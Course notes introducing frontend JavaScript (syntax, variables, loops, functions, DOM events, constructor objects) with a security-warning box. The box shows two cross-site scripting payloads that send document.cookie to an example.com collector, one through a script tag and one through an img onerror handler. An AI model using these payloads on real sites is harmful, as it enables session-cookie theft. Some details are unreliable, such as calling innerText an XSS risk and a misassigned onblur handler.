# Frontend scripting with Javascript

> 🌐 Supporting learning material
>
> Javascript book: Ferguson, R. (2019). Beginning JavaScript: The Ultimate Guide to Modern JavaScript Development. [Link](https://limo.libis.be/primo-explore/fulldisplay?docid=TN_springer_s978-1-4842-4395-4_313453&context=PC&vid=VIVES_KATHO&search_scope=ALL_CONTENT&tab=all_content_tab&lang=nl_BE:) (you must first log in via [ limo](http://limo.libis.be/index.html#/vives) before you can use this link)
>
> Developer webpage: [Mozilla](https://developer.mozilla.org/en-US/docs/Web/JavaScript)
>
> LinkedIn Learning Course: [Learning the Javascript Language](https://www.linkedin.com/learning/learning-the-javascript-language-2/)
> 
> LinkedIn Learning Course: [Validating and processing Forms with Javascript - chapters 1-3](https://www.linkedin.com/learning/validating-and-processing-forms-with-javascript-and-php)


**JavaScript** (JS) is a lightweight, interpreted programming language with top-notch features. Although best known as the web page scripting language, it is also used by many non-browser environments, such as node.js.

The standard for JavaScript is ECMAScript. As of 2012, all modern browsers fully support ECMAScript 5.1. On June 17, 2015, ECMA International released the sixth major version of ECMAScript, officially called ECMAScript 2015, and more commonly referred to as ECMAScript 2015 or ES2015. Since then, the ECMAScript standards have been released on an annual basis.

Don't confuse JavaScript with the Java programming language. Both "Java" and "JavaScript" are trademarks or registered trademarks of Oracle in the US and other countries. In contrast, the two programming languages ​​have very different syntax, semantics, and applications.

Javascript allows web pages to be made more interactive by accessing and modifying the content and layout of a web page while the page is being viewed in the browser. i.e. Javascript allows you to make a web page **dynamic** so that it responds to what the user does. Every action that needs to be done takes place via a **script** and is processed by the browser, so on the **client-side**.

## Troubleshooting

When we write code it is usually by trial and error. Making mistakes is part of the coding proces.
We distinguish two types of errors:

* **Syntax errors**: These are errors where the Javascript syntax is not correct. Usually these are typos or bits we forgot.
* **Logic errors**: Here the syntax of Javascript is correct but the result is not what we expected or intended. The fault lies in the logic of our program, which is more difficult to figure out.

Fortunately, our browser has a development environment that can help us with this. For Google Chrome you open this via `F12` and in Safari you can open this via the `Develop > Show Web Inspector` menu.

You can log values ​​of variables to the console to try and find logic errors.

```js
console.log('Result : ' + total);
```

Sometimes the error is a bit more complex and we need to debug.
Have a look at the information on the [developer page of Chrome](https://developer.chrome.com/docs/devtools/javascript/)

## The dangers of internet sources

It's completly normal for a (starting) developer to use the internet as a source of information. Keep in mind that everyone can post something on the web, professionals, hobbyists and also people with bad intentions. **So always double check a source before implementing some code to your project!**

:::danger ⛔Security risk

Never use the `.innerHTML` or `.innerText` syntax, it entails huge **security risks**!

Specifically **Cross-Site Scripting Attacks** (XSS). Below are two examples of how a hacker can access a user account with simple code:

1. In this example we store cookie info in a variable that can then be sent to another server.

```html
<script>var adr='http://example.com/xss.php?cookie=' + escape(document.cookie);</script>
```

2. In this example we use a missing image with an HTML attribute to trigger code

```html
<img scr="http://nofile" onerror="adr='http.example.com/xss.php?'+escape(document.cookie)";>
```
:::

## Become familiar with the syntax

First of all you need to understand that javascript is interpreted line by line by the browser. While with c++ you compile the program into machine language instructions and then let it run independently.

### Add javascript to your html page.

You can choose to add a script block to your html page. If possible, avoid this technique.

```html
<head>
    <script defer type="text/javascript">
        // here goes the java code
    </script>
</head>
```
Or you can work with a separate file, which is preferable.

```html
<head>
    <script defer src="/scripts/script.js"></script>
</head>
```

By using the attribute `defer` the browser will wait for the DOM to be loaded before loading the script. This can be imported for users with slow internet connection.

::: tip 💡Tip
* Create a 'scripts' folder in your project folder in which you place the Javascript files.
* If you use other javascripts in your javascript, you must place these script links before yours.
:::

### Variables

In javascript, variables are loosely typed, which means that the data type depends on what you put in the variable. So you can perfectly have an integer in a variable one moment and have a string in that same variable a few moments later.

**let**
```js
let y = 13
```
Let is a variable definition that is valid only within the block scope `{}` in which it is defined.

**var**
```js
var y = 12
```
Var is a general variable definition, so if you define it within a function, the function is the scope of the variable, if you place it at the top, the entire script file becomes the scope.

**const**
```js
const y = 11
```
Const is the definition of a constant, has the same scope as let but you cannot change the value.

::: warning ❗Attention
If you define a variable without let, var or const then it is automatically a global variable. Then you must pay attention not to define a variable with the same name anywhere else.

To avoid accidentally forgetting let, var or const you can add `"use strict";` at the top of your script file. Then you will get an error message if you forget.
:::

🔥 **Variable Naming Rules**

1. The name must start with a letter, a `$` or a `_`. Never with a number!
2. The name can contain letters, numbers, a `$` or a `_`. Never a `-` or `.`!
3. You cannot use words that have a script meaning (eg var).
4. The name is case sensitive, you always start it with a lowercase letter. You never reuse a variable name with a different capital combination.
5. Use a name that describes its information content.
6. If a name consists of several words, use a capital letter  for the second and next word(s) (eg firstName), also called **lowerCamelCase**.

### Data types

Within javascript 7 primitive data types are used:
* **Boolean**: true or false
* **Number**: integer or float
* **BigInt**: an integer with unlimited size, recognizable by a small n after the number e.g. `23232n`
* **String**: text
* **Undefined**: the data type is not yet defined eg `let a;`
* **Null**: to indicate a special value 'null'
* **Symbol**: each instance is unique, eg `Symbol("description");`

In addition, you have the **object** type that can be used to store a collection of values.
```js
let obj = {name: 'Samira', age : 25};
```
There are 4 more special object types:
* **Function**
* **Array**
* **Date**
* **RegExp**

### Logical operators

We can use the well-known logical operators in javascript to build conditions:

* `&&` the AND operator
* `||` the OR operator
* `!` the NOT operator

What is special about the interpretation of conditions is that javascript looks at the condition until the outcome has been determined with certainty, the rest of the condition is no longer interpreted at that time.
```js
false && (a=2) // left part is false, so the condition is false, a=2 will not be executed anymore.
```

### Decisions

We can use the usual decision trees in javascript:

```js
if(...){
  // code
}
else if(...){
  // code
}
else {
  // code
}

switch(answer){
  case "YES":
    // code
    break;
  default:
    // code
    break;
}
```
We also have the ternary operator:
```js
(animal === 'cat') ? console.log("cat") : console.log("no cat");
```

### Loops

We can also work with loops in Javascript:

```js
// for loop
for (let i=0; i<10; i++){}

// for-of loop
let names = ['Pete','John','Pol'];
for (let name of names) {
   console.log(name);
};

// for-in loop
let names = {n1:'Pete',n2:'John',n3:'Pol'};
for (let i in names) {
   if(names.hasOwnProperty(i)) console.log(names[i]);
};

// forEach loop
let names = ['Pete','John','Pol'];
names.forEach(function(name) {
    console.log(name);
});

// while loop
let count = 5;
while (count > 0){
  console.log(count);
  count--;
}

//do-while loop
let count = 5;
do {
  console.log(count);
  count--;
} while (count > 0);
```

### Functions

We can also work with methods and functions in javascript:
```js
// method
function sayMessage(message){
   if(typeof(message)==='string') console.log(message);
}
// function
function isEven(n) {
  return ((n%2)===0);
}
// call the function
let even=isEven(10);
```
In addition, we can also work with parameters here:
```js
// function with default parameters
function sayMessage(message, times){
  times=(typeof(times)!=='undefined') ? times:10;
  if(typeof(message)==='string'){
    for(let i=0;i<times;i++) console.log(message);
  }
}
// function with the number of parameters of your choice, parameters go into the array 'arguments'
function sayMessages(){
  for (let i=0; i< arguments.length; i++) console.log(arguments[i]);
}
```
Passing parameters also works on the principle of 'pass by value', i.e. the value of temporary is copied to a local variable. However, this is not the case for reference variables such as an object. There the principle of 'pass by reference' applies and there is a temporary variable that refers to the original.

```js
// pass by value example
let message='hi';
function changeMessage(message){
  message="test";
}
changeMessage(message);
console.log(message); // the result is 'hi'

// pass by reference example
let obj={msg:'hi'};
function changeMessage(message){
  message.msg="test";
}
changeMessage(obj);
console.log(obj.msg); // the result is 'test'
```

You can also be creative with functions.

```js
// a function as a variable
let sayMessage= function(message){ console.log(message); }
// pass a function as a parameter
window.setTimeout(sayMessage,5000,'Hi');
// a function as part of an object
let obj= { f: function(message){ console.log(message); } };
obj.f('Hi');
// an anonymous function (which has no name)
numbers.forEach( function(i) { console.log("array contains ",i);})
// an arrow function
double = i => (i*2);
```
A function that is passed as a parameter to another function is called a **'callback function'**.

### Error handling

Just like in C++ you can provide the error handling with `try` and `catch`.

```js
try {
  // here goes the code you want to run
} catch(e){
  console.warn(e); // if an error occurs it will be sent to the console.
}
```

### Comments

As always, it's good practice to comment your code.

```js
/**
  * A block of comments
  * across multiple lines
  */

// Comment on 1 single line.
```

### Browser objects

At the top level is the **browser object model** with information from the current browser window or tab.

![image](./images/image7.png)

A level lower you can find the **document object model** with information about the DOM structure of the page.

![image](./images/image8.png)

### link to HTML elements

There are a few possibilities to retrieve elements of an HTML page in javascript:

* getElementById() : one element with a given id
* getElementByName() : list of elements with a given name
* getElementByTagName() : list of a certain type of elements
* querySelectorAll() : list of elements that match a CSS selector
* querySelector() : first element that satisfies a CSS selector

### Handle events

Events are all events in a browser. e.g. the user clicks on something, an element gets the focus, ...

**Older technology (supported by all browsers)**

You can link one function to an event for a browser.

![image](./images/image9.png)

```js
function checkUsername(){
  // code...
}

let userName = document.getElementById('username');
userName.onblur = checkUsername(); // if the focus of this element disappears then execute this function.
```

**Newer technology (only supported by newer browsers)**

You can now link multiple functions to an event.

![image](./images/image10.png)

```js
function checkUsername(){
  // code...
}

let userName = document.getElementById('username');
userName.addEventListener('blur', checkUsername, false);
```

An event is actually an object with properties.

For example, you can find out in the handling function who the event owner is:

```js
function checkUsername(e){
  let target = e.target; // owner of the event.
  // code...
}

let userName = document.getElementById('username');
userName.addEventListener('blur', checkUsername, false);
```

### Using objects as a kind of class

Suppose we want a class **hotel** in which we want to store the name of the hotel, the number of rooms and the number of rooms booked.
We also want a function that returns the rooms that are still available.

Then we can write a constructor for this as follows:
```js
function hotel(name, rooms, booked){
  this.name = name;
  this.rooms = rooms;
  this.booked = booked;
  this.checkAvailability = function(){
    return this.rooms - this.booked;
  }
}
```
and define the hotel as follows:

```js
let parkHotel = new hotel('Park',120,77);
```
if we now want to have the number of rooms still available, we write:

```js
let available = parkHotel.checkAvailability();
```